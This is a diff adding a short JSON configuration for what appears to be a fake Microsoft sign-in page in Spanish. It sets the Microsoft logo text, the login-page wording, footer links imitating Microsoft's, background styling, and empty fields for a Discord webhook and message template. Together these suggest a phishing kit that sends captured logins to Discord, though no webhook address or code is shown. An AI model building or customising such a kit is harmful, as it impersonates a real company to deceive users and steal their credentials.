@@ -1,0 +1,15 @@
+{
+  "logoText": "Microsoft",
+  "pageTitle": "Iniciar sesión en su cuenta",
+  "welcomeText": "Use su cuenta",
+  "footerHelpText": "Ayuda",
+  "footerTermsText": "Términos de uso",
+  "footerPrivacyText": "Privacidad y cookies",
+  "footerPrivateTip": "Usa la exploración privada si este no es tu dispositivo. Más información",
+  "discordWebhook": "",
+  "discordMessageTemplate": "",
+  "loginBgType": "gradient",
+  "loginBgColor": "#0a0a1a",
+  "loginBgGradient": "linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)",
+  "loginBgImage": ""
+}
